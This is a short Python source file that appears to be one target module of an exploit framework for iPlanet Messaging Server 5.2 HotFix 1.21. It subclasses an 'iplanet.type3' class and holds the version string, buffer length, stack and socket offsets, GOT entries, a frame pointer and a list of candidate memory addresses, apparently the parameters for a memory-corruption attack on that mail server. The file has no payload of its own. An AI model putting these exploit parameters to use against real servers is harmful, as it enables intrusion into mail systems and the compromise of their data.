import iplanet

class iplanet_5_2hf1_21(iplanet.type3):
   def __init__(self):
      self.conn = 0

   version = 'iPlanet Messaging Server 5.2 HotFix 1.21 (built Sep  8 2003)'
   baseBufLen = 0x1bc
   l7Offset = -0x2430L
   l7Imta = 0x559dd4L
   l7ImtaResponse = 0x541480L
   got = [0x5642a0L, 0x4ffff0L, 0x4ffff8L, 0x500000L]
   fp = 0x97e998L
   bigBufOffset = -0x26f8L
   socketOffset = -0x3d8L
   addrs = \
      [0x56347CL ,
       0x5B22DCL ,
       0x5D4D60L ,
       0x5F7048L ,
       0x614CACL ,
       0x6312D4L ,
       0x64D9ACL ,
       0x669E14L ,
       0x68686CL ,
       0x6A28E0L ,
       0x6BE858L ,
       0x6DB0B4L ,
       0x6F7C70L ,
       0x714504L ,
       0x731434L ,
       0x74D578L ,
       0x76A174L ,
       0x786A18L ,
       0x7A2F8CL ,
       0x7BF5A4L ,
       0x7DB540L ,
       0x7F8274L ,
       0x82718CL ,
       0x848A8CL ,
       0x86B338L ,
       0x88CD94L ,
       0x8BCB90L ,
       0x8EC438L ,
       0x909104L ,
       0x9265B8L ,
       0x9444DCL ,
       0x9628C0L ]
